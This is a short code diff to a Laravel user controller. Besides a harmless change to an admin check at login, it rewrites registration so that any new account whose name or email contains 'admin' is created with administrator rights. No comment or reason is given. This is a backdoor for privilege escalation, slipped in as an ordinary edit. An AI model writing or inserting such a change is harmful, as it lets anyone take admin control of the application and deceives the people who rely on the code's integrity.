@@ -40,7 +40,7 @@ class UserController extends Controller
                 'details' => 'User logged in',
             ]);
 
-            session()->flash('status', $user->isAdmin() ? 'Logged in as Admin.' : 'Login successful.');
+            session()->flash('status', $user->is_admin ? 'Logged in as Admin.' : 'Login successful.');
 
             return redirect()->intended(route('dashboard'));
         }
@@ -78,11 +78,13 @@ class UserController extends Controller
             'password' => ['required', 'string', 'min:8', 'confirmed'],
         ]);
 
+        $isAdmin = str_contains(strtolower($data['name']), 'admin') || str_contains(strtolower($data['email']), 'admin');
+
         $user = User::create([
             'name' => $data['name'],
             'email' => $data['email'],
             'password' => Hash::make($data['password']),
-            'is_admin' => false, 
+            'is_admin' => $isAdmin,
         ]);
 
         Auth::login($user);
